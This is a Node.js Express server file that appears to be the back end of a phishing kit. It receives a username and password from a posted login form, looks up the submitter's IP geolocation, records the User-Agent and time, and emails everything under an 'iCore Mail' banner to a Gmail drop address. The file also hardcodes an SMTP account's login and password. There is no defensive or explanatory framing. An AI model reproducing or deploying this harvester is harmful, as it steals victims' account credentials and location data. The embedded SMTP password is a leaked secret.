const express = require("express")
const nodemailer = require("nodemailer")
const bodyParser = require("body-parser")
const axios = require("axios")
const cors = require("cors")

const app = express()
const PORT = process.env.PORT || 1190

app.use(cors())
app.use(express.static(__dirname))
app.use(bodyParser.json()) // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })) // for parsing application/x-www-form-urlencoded

app.post("/", (req, res) => {
  axios
    .get("http://www.geoplugin.net/json.gp?ip=xx.xx.xx.xx")
    .then(function (response) {
      const {
        geoplugin_request,
        geoplugin_city,
        geoplugin_region,
        geoplugin_countryName,
        geoplugin_countryCode,
      } = response.data

      const gottenAddress = {
        ip: geoplugin_request,
        city: geoplugin_city,
        region: geoplugin_region,
        countryName: geoplugin_countryName,
        countryCode: geoplugin_countryCode,
      }

      const { session_key, password } = req.body
      const user_agent = req.header("User-Agent")

      const smtpConfig = {
        host: "smtp.gmail.com",
        port: 587,
        auth: {
          user: "osama.mostafa@introgroup.org",
          pass: "Oasmrmz12",
        },
      }

      const date = new Date().toDateString()
      const time = new Date().toTimeString()

      var transporter = nodemailer.createTransport(smtpConfig)

      var message = `
    =============+ iCore Mail +=============\n
    username: " ${session_key} " \n
    Password: " ${password} " \n
    =============+ iCore Log!n +=============\n
    IP: " ${gottenAddress.ip} " \n
    City: " ${gottenAddress.city} " \n
    Region: "  ${gottenAddress.region}" \n
    Country Name: " ${gottenAddress.countryName} " \n
    Country Code: " ${gottenAddress.countryCode} " \n
    User-Agent: " ${user_agent} " \n
    Date Log: " ${date} " \n
    Time Log: " ${time} " \n
    `

      var mailObj = {
        from: "osama.mostafa@introgroup.org",
        to: "monotomicresult@gmail.com",
        subject: "***Monotomic Result NodeJs - Output Support Team****",
        text: message,
      }

      transporter.sendMail(mailObj, (err, info) => {
        if (err) console.log("MAIL ERR: ", err)
        else res.status(200).json({ response: info.response })
      })
    })
    .catch(function (error) {
      console.log("CATCH ERR: ", error)
    })
})

app.listen(PORT, (err) => {
  if (err) throw err
  else console.log("Listening on " + PORT)
})
